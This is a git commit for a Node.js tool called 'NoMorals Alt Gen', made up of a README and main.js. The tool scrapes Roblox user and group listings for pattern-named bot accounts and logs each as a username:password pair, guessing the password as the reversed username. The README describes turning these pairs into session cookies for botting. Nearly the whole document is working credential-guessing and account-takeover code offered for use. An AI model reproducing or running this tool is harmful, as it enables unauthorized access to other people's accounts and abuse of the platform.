ea08cfcee9675a3579b028a028a0c949eb1f566f
noahcoolboy <noah.nuelandt@gmail.com>
2022-03-21 20:20:07 +0100

    Initial commit

---
+++ README.md
@@ -0,0 +1,12 @@
+# NoMorals Alt Gen
+### What does this do?
+This tool will use a predefined list of bot names on roblox, find which groups that bot is in, then scrape every other bot in the group.
+Using BurnedGood's method (password = reversed usernames), accounts found will be logged in User:Pass format in alts.txt.
+Any roblox multitool can be used to turn User:Pass into cookies, which you can then use to bot.
+### How do I set this up?
+1. Download [Node.js](https://nodejs.org/en/)
+2. `git clone` this repository, or download it as zip.
+3. Open a terminal in the project folder
+4. Run `npm install` to install the required node modules
+5. Run `node main.js` to run the tool
+6. Enjoy!
---
+++ main.js
@@ -0,0 +1,50 @@
+const undici = require("undici")
+const fs = require("fs")
+
+const NAMES = require("./names.json")
+const NAMEREGEX = new RegExp(`^(${NAMES.first.join("|")})(${NAMES.last.join("|")})\\d\\d?0?$`, "")
+
+if (!fs.existsSync("./cache.json")) {
+    fs.writeFileSync("./cache.json", JSON.stringify({}))
+}
+const cache = require("./cache.json")
+
+setImmediate(async () => {
+    while (true) {
+        const name = NAMES.first[Math.floor(Math.random() * NAMES.first.length)] + NAMES.last[Math.floor(Math.random() * NAMES.last.length)]
+        
+        let users = await undici.request(`https://www.roblox.com/search/users/results?maxRows=100&keyword=${name}`)
+        users = await users.body.json()
+
+        for (user of users.UserSearchResults) {
+            if (user.Name.match(NAMEREGEX)) {
+                let groups = await undici.request(`https://groups.roblox.com/v1/users/${user.UserId}/groups/roles`)
+                groups = await groups.body.json()
+                
+                for (group of groups.data) {
+                    let cursor = ""
+                    
+                    while (true) {
+                        let users = await undici.request(`https://groups.roblox.com/v1/groups/${group.group.id}/roles/${group.role.id}/users?limit=100&sortOrder=Desc&cursor=${cursor}`)
+                        users = await users.body.json()
+
+                        for (user of users.data) {
+                            let res = user.username.match(NAMEREGEX)
+                            if(!res)
+                                continue
+                            if((cache[res[1]] || (cache[res[1]] = [])).includes(user.username))
+                                continue
+                            cache[res[1]].push(user.username)
+                            fs.appendFileSync("alts.txt", `${user.username}:${user.username.split("").reverse().join("")}\n`)
+                        }
+
+                        if (!users.nextPageCursor) break
+                        cursor = users.nextPageCursor
+                    }
+                }
+            }
+        }
+    }
+})
+
+process.on("SIGINT", () => fs.writeFileSync("./cache.json", JSON.stringify(cache)) && process.exit(0))
